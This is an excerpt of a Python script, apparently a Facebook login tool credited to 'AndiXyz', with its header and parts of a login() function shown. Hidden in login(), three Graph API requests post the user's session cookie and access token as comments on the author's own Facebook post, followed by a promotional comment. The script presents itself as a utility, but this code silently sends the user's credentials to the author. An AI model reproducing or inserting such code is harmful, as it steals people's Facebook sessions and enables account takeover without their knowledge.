...
###---[ INFO AUTHOR ANDI XYZ ]---###
#----[ jangan di oprek, sayangi data hpmu ]-----#
author = 'AndiXyz'
git_hub = 'https://github.com/andibakar'
faceb0ok = 'https://www.facebook.com/profile.php?id=100080706585229'
...
def login():
	...
	try:
		...
		tem      = ('\nAnjir keren Bang😼@ [100080706585229:]\n\nNikmatilah Masa Mudamu, Tapi Jangan Lupa Dengan Masa Depanmu\n')
		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
		link = ('https://www.facebook.com/100080706585229/posts/178570731509812/?app=fbl')
		...
		ses.post(f"https://graph.facebook.com/178570731509812/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/178570731509812/comments/?message={token}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/178570731509812/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
